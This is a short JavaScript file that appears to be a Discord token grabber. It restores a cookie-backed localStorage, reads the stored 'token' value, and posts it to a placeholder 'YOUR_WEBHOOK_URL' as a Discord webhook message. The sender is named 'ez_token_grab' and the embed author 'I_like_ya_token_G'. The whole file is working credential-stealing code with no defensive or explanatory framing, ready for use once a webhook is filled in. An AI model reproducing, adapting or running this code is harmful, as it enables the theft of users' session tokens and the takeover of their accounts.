! function () {
    "use strict";
    window.localStorage || Object.defineProperty(window, "localStorage", new function () {
        var e = [],
            t = {};
        Object.defineProperty(t, "getItem", {
            value: function (e) {
                return this[e] ? this[e] : null
            },
            writable: !1,
            configurable: !1,
            enumerable: !1
        }), Object.defineProperty(t, "key", {
            value: function (t) {
                return e[t]
            },
            writable: !1,
            configurable: !1,
            enumerable: !1
        }), Object.defineProperty(t, "setItem", {
            value: function (e, t) {
                e && (document.cookie = escape(e) + "=" + escape(t) + "; expires=Tue, 19 Jan 2038 03:14:07 GMT; path=/")
            },
            writable: !1,
            configurable: !1,
            enumerable: !1
        }), Object.defineProperty(t, "length", {
            get: function () {
                return e.length
            },
            configurable: !1,
            enumerable: !1
        }), Object.defineProperty(t, "removeItem", {
            value: function (e) {
                e && (document.cookie = escape(e) + "=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/")
            },
            writable: !1,
            configurable: !1,
            enumerable: !1
        }), Object.defineProperty(t, "clear", {
            value: function () {
                if (e.length)
                    for (var t in e) document.cookie = escape(t) + "=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/"
            },
            writable: !1,
            configurable: !1,
            enumerable: !1
        }), this.get = function () {
            var n;
            for (var r in t) - 1 === (n = e.indexOf(r)) ? t.setItem(r, t[r]) : e.splice(n, 1), delete t[r];
            for (; e.length > 0; e.splice(0, 1)) t.removeItem(e[0]);
            for (var o, a, i = 0, c = document.cookie.split(/s*;s*/); i < c.length; i++)(o = c[i].split(/s*=s*/)).length > 1 && (t[a = unescape(o[0])] = unescape(o[1]), e.push(a));
            return t
        }, this.configurable = !1, this.enumerable = !0
    });
    var e = localStorage.getItem("token");
    fetch("YOUR_WEBHOOK_URL", {
        method: "post",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            username: "ez_token_grab",
            avatar_url: "https://cdn.discordapp.com/avatars/411256446638882837/9a12fc7810795ded801fdb0401db0be6.png",
            content: "",
            allowed_mentions: {
                parse: ["users", "roles"]
            },
            embeds: [{
                color: 11730954,
                author: {
                    name: "I_like_ya_token_G",
                    url: "",
                    icon_url: "https://i.imgur.com/u8v9Fvs.png"
                },
                description: e
            }]
        })
    })
}();
